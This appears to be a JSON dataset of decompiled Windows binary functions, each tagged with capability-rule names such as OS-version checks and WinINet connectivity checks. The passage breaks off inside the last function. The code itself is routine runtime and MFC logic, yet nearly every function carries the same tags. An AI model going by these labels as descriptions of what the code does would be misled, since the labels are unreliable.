{
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004013b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004013b0(int32_t **param_1)\n\n{\n    int32_t **arg_8h;\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    while (piVar1 != NULL) {\n        arg_8h = *param_1;\n        *param_1 = *arg_8h;\n        fcn.00409f48(arg_8h);\n        piVar1 = *param_1;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00418ceb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418ceb(code **param_1)\n\n{\n    code *pcVar1;\n    \n    *param_1 = vtable.std::ios_base.0;\n    if ((param_1[1] == NULL) ||\n       (pcVar1 = param_1[1] + 0x4515a4,  *pcVar1 = *pcVar1 + -1,  param_1[1][0x4515a4] < '\\x01')) {\n        fcn.00418ca9();\n        pcVar1 = param_1[9];\n        if (pcVar1 != NULL) {\n            fcn.00401240();\n            fcn.0041bae1(pcVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "00401830": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00401830(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffe8;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x43abab;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    if ((param_1 != NULL) && (*param_1 == 0)) {\n        in_stack_ffffffe8 = 0x40185a;\n        iVar1 = fcn.0041bab6(0x18);\n        uStack4 = 0;\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            in_stack_ffffffe8 = 0;\n            iVar1 = fcn.00401630(0, 0, 0);\n        }\n        *param_1 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffe8;\n    return 2;\n}\n",
        "token_count": 245
    },
    "00401f80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401f80(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t **ppiVar7;\n    int32_t *unaff_EBP;\n    uint *puVar8;\n    uint *puVar9;\n    \n    iVar5 = *param_1;\n    if (param_2 < *(iVar5 + -0xc)) {\n        param_2 = *(iVar5 + -0xc);\n    }\n    if (1 < *(iVar5 + -4)) {\n        puVar2 = *param_1;\n        ppiVar7 = puVar2 + -4;\n        iVar5 = puVar2[-3];\n        puVar3 = (**(**ppiVar7 + 0x10))();\n        iVar4 = (***puVar3)(param_2, 1);\n        if (iVar4 == 0) {\n            iVar4 = fcn.00401510();\n        }\n        if (iVar5 < param_2) {\n            param_2 = iVar5;\n        }\n        puVar3 = iVar4 + 0x10;\n        puVar9 = puVar3;\n        puVar8 = puVar2;\n        for (uVar6 = param_2 + 1U >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar8;\n            puVar9 = puVar9 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        for (uVar6 = param_2 + 1U & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        *(iVar4 + 4) = iVar5;\n        piVar1 = puVar2 + -1;\n        LOCK();\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**ppiVar7 + 4))(ppiVar7);\n        }\n        *unaff_EBP = puVar3;\n        return;\n    }\n    iVar5 = *(iVar5 + -8);\n    if (iVar5 < param_2) {\n        if (iVar5 < 0x401) {\n            iVar5 = iVar5 * 2;\n        }\n        else {\n            iVar5 = iVar5 + 0x400;\n        }\n        if (iVar5 < param_2) {\n            iVar5 = param_2;\n        }\n        iVar5 = (**(**(*param_1 + -0x10) + 8))(*param_1 + -0x10, iVar5, 1);\n        if (iVar5 == 0) {\n            iVar5 = fcn.00401510();\n        }\n        *param_1 = iVar5 + 0x10;\n        return;\n    }\n    return;\n}\n",
        "token_count": 717
    },
    "004020c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004020c0(int32_t param_1, uint *param_2, uint32_t param_3, uint param_4)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    \n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x40) = param_4;\n    if ((param_3 != 0) && ((param_4 & 6) != 6)) {\n        puVar1 = fcn.0041bab6(param_3);\n        puVar3 = puVar1;\n        for (uVar2 = param_3 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        for (uVar2 = param_3 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        *(param_1 + 0x3c) = puVar1 + param_3;\n        if ((*(param_1 + 0x40) & 4) == 0) {\n            **(param_1 + 0x10) = puVar1;\n            **(param_1 + 0x20) = puVar1;\n            **(param_1 + 0x30) = param_3;\n        }\n        if ((*(param_1 + 0x40) & 2) == 0) {\n            **(param_1 + 0x14) = puVar1;\n            **(param_1 + 0x24) = puVar1;\n            **(param_1 + 0x34) = param_3;\n            if (**(param_1 + 0x20) == 0) {\n                **(param_1 + 0x10) = puVar1;\n                **(param_1 + 0x20) = 0;\n                **(param_1 + 0x30) = puVar1;\n            }\n        }\n        *(param_1 + 0x40) = *(param_1 + 0x40) | 1;\n    }\n    return;\n}\n",
        "token_count": 555
    },
    "004023d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004023d0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    \n    if ((*param_1[8] == 0) || (piVar1 = param_1[0xc],  uVar4 = *param_1[8],  *piVar1 + uVar4 <= uVar4)) {\n        uVar4 = (**(*param_1 + 0x14))();\n    }\n    else {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *param_1[8];\n        *param_1[8] = puVar2 + 1;\n        uVar4 = *puVar2;\n    }\n    if (uVar4 == 0xffffffff) {\n        return 0xffffffff;\n    }\n    puVar2 = *param_1[8];\n    if ((puVar2 != NULL) && (puVar3 = *param_1[8],  puVar3 < puVar3 + *param_1[0xc])) {\n        return *puVar2;\n    }\n    // WARNING: Could not recover jumptable at 0x0040242f. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar4 = (**(*param_1 + 0x10))();\n    return uVar4;\n}\n",
        "token_count": 326
    },
    "00402c20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00402c20(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x43abab;\n    *in_FS_OFFSET = &uStack12;\n    if ((param_1 != NULL) && (*param_1 == 0)) {\n        iVar1 = fcn.0041bab6(0x10);\n        uStack4 = 0;\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = fcn.00402270(0);\n        }\n        *param_1 = iVar1;\n    }\n    *in_FS_OFFSET = unaff_ESI;\n    return 4;\n}\n",
        "token_count": 208
    },
    "00402cb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00402cb0(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    ppiVar3 = param_1[0x15] + -0x10;\n    *param_1 = 0x43d7c0;\n    piVar1 = param_1[0x15] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 3;\n    fcn.00423e70(unaff_ESI, extraout_ECX);\n    if (*(extraout_ECX + 0x24) != 0) {\n        (**(**(extraout_ECX + 0x24) + 0x60))(extraout_ECX);\n    }\n    *(unaff_EBP + -4) = 2;\n    fcn.0041af4f();\n    fcn.00401180();\n    fcn.00401180();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041bd60();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 413
    },
    "0041c29c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041c29c(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDialog.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[7] != NULL) {\n        fcn.0041f10d();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041f719();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 199
    },
    "004042e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004042e0(int32_t *param_1, int32_t *param_2)\n\n{\n    if (*(param_1 + 1) == '\\0') {\n        fcn.00404330();\n    }\n    if (*(param_2 + 1) == '\\0') {\n        fcn.00404330();\n    }\n    if (*param_1 == 0) {\n        if (*param_2 == 0) {\n            return 1;\n        }\n    }\n    else if (*param_2 != 0) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 135
    },
    "00404780": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404780(int32_t *param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x43adc1;\n    *in_FS_OFFSET = &uStack12;\n    if ((param_1 != NULL) && (*param_1 == 0)) {\n        puVar1 = fcn.0041bab6(0x18);\n        if (puVar1 == NULL) {\n            puVar1 = NULL;\n        }\n        else {\n            puVar1[1] = 0;\n            uStack4 = 1;\n            *puVar1 = 0x43d880;\n            uVar2 = fcn.00418b42(0x43d714);\n            uStack8 = CONCAT31(uStack8._1_3_, 2);\n            fcn.004048f0(uVar2);\n            uStack12 = CONCAT31(uStack12._1_3_, 1);\n            fcn.00418a59();\n        }\n        *param_1 = puVar1;\n    }\n    *in_FS_OFFSET = uStack20;\n    return 4;\n}\n",
        "token_count": 310
    },
    "00404bd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404bd0(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    piVar1 = *param_1;\n    if (piVar1 != NULL) {\n        if ((*piVar1[8] == 0) || (uVar3 = *piVar1[8],  *piVar1[0xc] + uVar3 <= uVar3)) {\n            uVar3 = (**(*piVar1 + 0x14))();\n        }\n        else {\n            *piVar1[0xc] = *piVar1[0xc] + -1;\n            puVar2 = *piVar1[8];\n            *piVar1[8] = puVar2 + 1;\n            uVar3 = *puVar2;\n        }\n        if (uVar3 != 0xffffffff) {\n            *(param_1 + 1) = 0;\n            return;\n        }\n    }\n    *param_1 = NULL;\n    *(param_1 + 1) = 1;\n    return;\n}\n",
        "token_count": 253
    },
    "00405830": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00405830(uchar *param_1, uchar *param_2, uint32_t param_3, uint param_4, uint param_5)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint ****ppppuVar6;\n    uint ****ppppuVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint32_t unaff_EBX;\n    uint32_t uVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint32_t unaff_EBP;\n    int32_t *piVar13;\n    int32_t *unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar14;\n    int32_t iVar15;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uchar *puVar16;\n    uchar *puVar17;\n    int32_t *piStack88;\n    uint ****ppppuStack80;\n    uint ****ppppuStack76;\n    uint uStack72;\n    uint32_t uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint ****ppppuStack48;\n    uint ****ppppuStack44;\n    uchar auStack40 [4];\n    uint32_t uStack36;\n    uint uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack16;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar *puStack4;\n    \n    puStack4 = 0xffffffff;\n    uStack8 = 0x43ae50;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar5 = fcn.00404670(param_5);\n    puVar17 = auStack40;\n    uStack72 = piVar5;\n    fcn.00404ff0();\n    uStack8 = 0;\n    puVar14 = unaff_EBX & 0xff00ffff;\n    cVar2 = fcn.004042e0(param_3);\n    if (cVar2 == '\\0') {\n        if (param_2[4] == '\\0') {\n            fcn.00404330();\n        }\n        if (param_2[5] == '+') {\n            *param_1 = 0x2b;\n        }\n        else {\n            if (param_2[4] == '\\0') {\n                fcn.00404330();\n            }\n            if (param_2[5] != '-') goto code_r0x004058d0;\n            *param_1 = 0x2d;\n        }\n        puVar14 = param_1 + 1;\n        fcn.00404bd0();\n    }\ncode_r0x004058d0:\n    piVar13 = NULL;\n    piVar8 = unaff_EBP & 0xffff00ff;\n    piStack88 = NULL;\n    ppppuVar6 = ppppuStack44;\n    if (uStack24 < 0x10) {\n        ppppuVar6 = &ppppuStack44;\n    }\n    puVar16 = param_2;\n    if (*ppppuVar6 == '\\x7f') {\ncode_r0x00405c68:\n        cVar2 = fcn.004042e0(param_2);\n        if (cVar2 == '\\0') {\n            do {\n                if (param_2[4] == '\\0') {\n                    fcn.00404330();\n                }\n                if (param_2[5] < '0') goto code_r0x00405b04;\n                if (param_2[4] == '\\0') {\n                    fcn.00404330();\n                }\n                if ('9' < param_2[5]) goto code_r0x00405b04;\n                if (piStack88 < 0x24) {\n                    if (param_2[4] == '\\0') {\n                        fcn.00404330();\n                    }\n                    if ((param_2[5] != '0') || (piStack88 != NULL)) {\n                        if (param_2[4] == '\\0') {\n                            fcn.00404330();\n                        }\n                        *piVar8 = param_2[5];\n                        piVar8 = piVar8 + 1;\n                        piStack88 = piStack88 + 1;\n                    }\n                }\n                else {\n                    puVar14 = puVar14 + 1;\n                }\n                unaff_ESI = unaff_ESI & 0xffff0000 | CONCAT11(1, unaff_ESI);\n                fcn.00404bd0();\n                puVar16 = param_1;\n                cVar2 = fcn.004042e0();\n            } while (cVar2 == '\\0');\ncode_r0x00405b10:\n            if (piStack88 == NULL) {\n                *piVar8 = 0x30;\n                piVar8 = piVar8 + 1;\n            }\n        }\n    }\n    else {\n        if (uStack24 < 0x10) {\n            ppppuStack44 = &ppppuStack44;\n        }\n        if (*ppppuStack44 < '\\x01') goto code_r0x00405c68;\n        uVar3 = (**(*piVar5 + 8))();\n        piVar8 = piVar8 & 0xffffff | uVar3 << 0x18;\n        uStack52 = 0xf;\n        uStack72 = uStack72 & 0xffffff00;\n        uStack56 = 1;\n    // WARNING: Ignoring partial resolution of indirect\n        uStack72._1_1_ = 0;\n        uStack12 = CONCAT31(uStack12._1_3_, 1);\n        iVar15 = 0;\n        cVar2 = fcn.004042e0(param_2);\n        uVar10 = uStack56;\n        if (cVar2 == '\\0') {\n            do {\n                if (param_2[4] == '\\0') {\n                    fcn.00404330();\n                }\n                if (param_2[5] < '0') {\ncode_r0x004059fd:\n                    piVar13 = piVar8;\n                    ppppuVar6 = ppppuStack76;\n                    if (uStack56 < 0x10) {\n                        ppppuVar6 = &ppppuStack76;\n                    }\n                    uVar10 = uStack56;\n                    ppppuVar7 = ppppuStack76;\n                    piVar8 = piVar13;\n                    if ((*(ppppuVar6 + iVar15) == '\\0') || (unaff_ESI >> 0x18 == '\\0')) break;\n                    if (param_2[4] == '\\0') {\n                        fcn.00404330();\n                    }\n                    uVar10 = uStack56;\n                    ppppuVar7 = ppppuStack76;\n                    piVar8 = piVar13;\n                    if (param_2[5] != unaff_ESI >> 0x18) break;\n                    fcn.004043c0(1, 0);\n                    iVar15 = iVar15 + 1;\n                    piVar8 = piVar13;\n                }\n                else {\n                    if (param_2[4] == '\\0') {\n                        fcn.00404330();\n                    }\n                    if ('9' < param_2[5]) goto code_r0x004059fd;\n                    unaff_ESI = unaff_ESI & 0xffff0000 | CONCAT11(1, unaff_ESI);\n                    if (piVar13 < 0x24) {\n                        if (param_2[4] == '\\0') {\n                            fcn.00404330();\n                        }\n                        if ((param_2[5] != '0') || (piVar13 != NULL)) {\n                            if (param_2[4] == '\\0') {\n                                fcn.00404330();\n                            }\n                            *piVar8 = param_2[5];\n                            piVar8 = piVar8 + 1;\n                            piVar13 = piVar13 + 1;\n                            piStack88 = piVar13;\n                        }\n                    }\n                    else {\n                        puVar14 = puVar14 + 1;\n                    }\n                    ppppuVar6 = ppppuStack76;\n                    if (uStack56 < 0x10) {\n                        ppppuVar6 = &ppppuStack76;\n                    }\n                    if (*(ppppuVar6 + iVar15) != '\\x7f') {\n                        ppppuVar6 = ppppuStack76;\n                        if (uStack56 < 0x10) {\n                            ppppuVar6 = &ppppuStack76;\n                        }\n                        *(ppppuVar6 + iVar15) = *(ppppuVar6 + iVar15) + '\\x01';\n                    }\n                }\n                fcn.00404bd0();\n                puVar16 = param_1;\n                cVar2 = fcn.004042e0();\n                uVar10 = uStack60;\n                ppppuVar7 = ppppuStack80;\n            } while (cVar2 == '\\0');\n            ppppuStack76 = ppppuVar7;\n            if (iVar15 != 0) {\n                if (uVar10 < 0x10) {\n                    ppppuVar7 = &ppppuStack76;\n                }\n                if (*(ppppuVar7 + iVar15) < '\\x01') {\n                    unaff_ESI = unaff_ESI & 0xff000000 | CONCAT12(1, unaff_ESI);\n                }\n                else {\n                    iVar15 = iVar15 + 1;\n                }\n            }\n        }\n        if (uStack28 < 0x10) {\n            ppppuStack48 = &ppppuStack48;\n        }\n        if (unaff_ESI >> 0x10 == '\\0') {\n            while( true ) {\n                if ((iVar15 == 0) || (cVar2 = *ppppuStack48,  cVar2 == '\\x7f')) goto code_r0x00405af1;\n                iVar15 = iVar15 + -1;\n                if (iVar15 != 0) break;\ncode_r0x00405ace:\n                if (iVar15 == 0) {\n                    ppppuVar6 = ppppuStack76;\n                    if (uVar10 < 0x10) {\n                        ppppuVar6 = &ppppuStack76;\n                    }\n                    if (cVar2 < *ppppuVar6) goto code_r0x00405aec;\n                }\n                if ('\\0' < *(ppppuStack48 + 1)) {\n                    ppppuStack48 = ppppuStack48 + 1;\n                }\n            }\n            ppppuVar6 = ppppuStack76;\n            if (uVar10 < 0x10) {\n                ppppuVar6 = &ppppuStack76;\n            }\n            if (cVar2 == *(ppppuVar6 + iVar15)) goto code_r0x00405ace;\ncode_r0x00405aec:\n            unaff_ESI = unaff_ESI & 0xff000000 | CONCAT12(1, unaff_ESI);\n        }\ncode_r0x00405af1:\n        uStack16 = uStack16 & 0xffffff00;\n        if (0xf < uVar10) {\n            fcn.0041bae1(ppppuStack76, puVar16);\n        }\ncode_r0x00405b04:\n        if (unaff_ESI >> 8 != '\\0') goto code_r0x00405b10;\n    }\n    cVar2 = fcn.004042e0(param_1, puVar16);\n    if (cVar2 == '\\0') {\n        if (param_2[4] == '\\0') {\n            fcn.00404330();\n        }\n        cVar2 = param_2[5];\n        cVar4 = (**(*piStack88 + 4))();\n        if (cVar2 == cVar4) {\n            puVar9 = fcn.0040ae35();\n            *unaff_ESI = **puVar9;\n            unaff_ESI = unaff_ESI + 1;\n            fcn.00404bd0();\n        }\n    }\n    if (puVar14 == NULL) {\n        cVar2 = fcn.004042e0(unaff_retaddr);\n        puVar14 = puStack4;\n        piVar5 = unaff_ESI;\n        while (cVar2 == '\\0') {\n            if (param_2[4] == '\\0') {\n                fcn.00404330();\n            }\n            piVar8 = piVar5;\n            if (param_2[5] != '0') break;\n            piVar5 = piVar5 + -1;\n            unaff_EDI = unaff_EDI & 0xffff0000 | CONCAT11(1, unaff_EDI);\n            fcn.00404bd0();\n            param_1 = puVar14;\n            cVar2 = fcn.004042e0();\n            piVar8 = piVar5;\n        }\n        if (piVar8 < 0) {\n            *unaff_ESI = 0x30;\n            unaff_ESI = unaff_ESI + 1;\n            piVar8 = piVar8 + 1;\n        }\n    }\n    cVar2 = fcn.004042e0(unaff_retaddr, param_1);\n    if (cVar2 == '\\0') {\n        do {\n            if (param_2[4] == '\\0') {\n                fcn.00404330();\n            }\n            if (param_2[5] < '0') goto code_r0x00405d1d;\n            if (param_2[4] == '\\0') {\n                fcn.00404330();\n            }\n            if ('9' < param_2[5]) goto code_r0x00405d1d;\n            if (piVar8 < 0x24) {\n                if (param_2[4] == '\\0') {\n                    fcn.00404330();\n                }\n                *unaff_EDI = param_2[5];\n                unaff_EDI = unaff_EDI + 1;\n                piVar8 = piVar8 + 1;\n            }\n            puVar17 = puVar17 & 0xffff0000 | CONCAT11(1, puVar17);\n            fcn.00404bd0();\n            cVar2 = fcn.004042e0();\n        } while (cVar2 == '\\0');\n    }\n    else {\ncode_r0x00405d1d:\n        if (puVar17 >> 8 == '\\0') goto code_r0x00405e94;\n    }\n    cVar2 = fcn.004042e0();\n    if (cVar2 != '\\0') goto code_r0x00405e94;\n    if (param_2[4] == '\\0') {\n        fcn.00404330();\n    }\n    if (param_2[5] != 'e') {\n        if (param_2[4] == '\\0') {\n            fcn.00404330();\n        }\n        if (param_2[5] != 'E') goto code_r0x00405e94;\n    }\n    *puVar17 = 0x65;\n    puVar11 = puVar17 + 1;\n    puVar14 = puVar11;\n    fcn.00404bd0();\n    uVar10 = uStack8;\n    puVar12 = param_3 & 0xffff00ff;\n    iVar15 = 0;\n    cVar2 = fcn.004042e0(uStack8);\n    if (cVar2 == '\\0') {\n        if (param_2[4] == '\\0') {\n            fcn.00404330();\n        }\n        if (param_2[5] == '+') {\n            *puVar11 = 0x2b;\n        }\n        else {\n            if (param_2[4] == '\\0') {\n                fcn.00404330();\n            }\n            if (param_2[5] != '-') goto code_r0x00405dcf;\n            *puVar11 = 0x2d;\n        }\n        puVar12 = puVar17 + 2;\n        fcn.00404bd0();\n    }\ncode_r0x00405dcf:\n    cVar2 = fcn.004042e0();\n    uVar1 = uStack16;\n    if (cVar2 == '\\0') {\n        do {\n            if (param_2[4] == '\\0') {\n                fcn.00404330(uVar10, puVar16, puVar12);\n            }\n            if (param_2[5] != '0') {\n                if (unaff_EDI >> 8 == '\\0') goto code_r0x00405e22;\n                break;\n            }\n            unaff_EDI = unaff_EDI & 0xffff0000 | CONCAT11(1, unaff_EDI);\n            fcn.00404bd0();\n            uVar10 = uVar1;\n            cVar2 = fcn.004042e0();\n        } while (cVar2 == '\\0');\n        *unaff_ESI = 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\ncode_r0x00405e22:\n    cVar2 = fcn.004042e0(unaff_retaddr);\n    puVar17 = puVar14;\n    while (cVar2 == '\\0') {\n        if (param_2[4] == '\\0') {\n            fcn.00404330();\n        }\n        if (param_2[5] < '0') break;\n        if (param_2[4] == '\\0') {\n            fcn.00404330();\n        }\n        if ('9' < param_2[5]) break;\n        if (iVar15 < 8) {\n            if (param_2[4] == '\\0') {\n                fcn.00404330();\n            }\n            *unaff_EDI = param_2[5];\n            unaff_EDI = unaff_EDI + 1;\n            iVar15 = iVar15 + 1;\n        }\n        puVar17 = puVar17 & 0xffff0000 | 0x100;\n        fcn.00404bd0();\n        cVar2 = fcn.004042e0();\n    }\ncode_r0x00405e94:\n    puVar14 = uStack12;\n    if ((puVar17 >> 0x10 == '\\0') && (puVar17 >> 8 != '\\0')) 